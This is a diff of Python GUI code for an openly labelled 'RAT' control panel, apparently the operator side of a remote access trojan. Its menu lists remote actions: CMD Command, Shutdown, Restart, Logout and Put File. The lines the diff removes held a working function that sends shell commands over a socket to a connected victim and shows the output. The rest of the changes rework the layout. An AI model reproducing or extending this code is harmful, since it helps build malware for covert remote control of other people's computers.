@@ -6,37 +6,14 @@ import time
 import sys
 import os
 
-def action_cmdcommand(client: socket.socket, content: ctk.CTkFrame):
-    content.destroy()
+def action_cmdcommand(client: socket.socket, content_field: ctk.CTkFrame):
+    content_field.destroy()
     
-    content = ctk.CTkFrame(root)
-    content.pack(pady=20, padx=20, fill='both', expand=True, side='right')
+    content = ctk.CTkFrame(root, height=450, width=700)
+    content.pack(pady=20, padx=20, fill='both', expand=False, side='right')
     
-    output_field = ctk.CTkTextbox(content, height=300, width=500)
-    output_field.pack(expand=True, pady=10, padx=10)
-    
-    input_cmd = ctk.CTkEntry(content, placeholder_text='Command', width=500)
-    input_cmd.pack(expand=True, side='left', pady=10, padx=10)
-    
-    send_cmd_button = ctk.CTkButton(content, text='Send CMD', command=lambda: action_cmdcommand_sendcmd(client, input_cmd.get(), output_field))
-    send_cmd_button.pack(side='right', pady=10, padx=10)
-
-def action_cmdcommand_sendcmd(client: socket.socket, cmd: str, outputfield: ctk.CTkTextbox):
-    if cmd == '':
-        cmd = 'cd'
-    client.send('cmd'.encode())
-    client.send(cmd.encode())
-    output = client.recv(1024).decode()
-    outputfield.delete(index1='1.0', index2='1000.0')
-    outputfield.insert(index='1.0', text=output)
-
-
-def action_screenshot(client: socket.socket, content: ctk.CTkFrame):
-    content.destroy()
-
-    content = ctk.CTkFrame(root)
-    content.pack(pady=20, padx=20, fill='both', expand=True, side='right')
-
+    input_cmd = ctk.CTkEntry(content, placeholder_text='Command')
+    input_cmd.pack(pady=10, padx=10)
 
 def gui(client: socket.socket, addr):
     ctk.set_appearance_mode('dark')
@@ -46,23 +23,22 @@ def gui(client: socket.socket, addr):
     root = ctk.CTk()
     root.title(f'Client: {addr}')
     root.iconbitmap(os.path.join(os.path.dirname(sys.argv[0]), 'assets', 'icon.png'))
-    root.geometry('900x450')
+    # root.geometry('900x450')
     root.resizable(False, False)
     
-    menu = ctk.CTkFrame(root)
-    menu.pack(fill='both', expand=False, side='left')
+    menu = ctk.CTkFrame(root, height=450, width=250)
+    menu.pack(fill='both', expand=True, side='left')
     
-    global content
     content = ctk.CTkFrame(root, height=450, width=700)
-    content.pack(pady=20, padx=20, fill='both', expand=True, side='right')
+    content.pack(pady=20, padx=20, fill='both', expand=False, side='right')
     
     
     title = ctk.CTkLabel(menu, text='RAT', font=('Robot', 24))
     title.pack(pady=10, padx=20)
     
     buttons = [
-        ctk.CTkButton(menu, text='CMD Command', command=lambda: action_cmdcommand(client, content)),
-        ctk.CTkButton(menu, text='Shutdown', command=lambda: action_screenshot(client, content)),
+        ctk.CTkButton(menu, text='CMD Command'),
+        ctk.CTkButton(menu, text='Shutdown'),
         ctk.CTkButton(menu, text='Restart'),
         ctk.CTkButton(menu, text='Logout'),
         ctk.CTkButton(menu, text='Put File'),
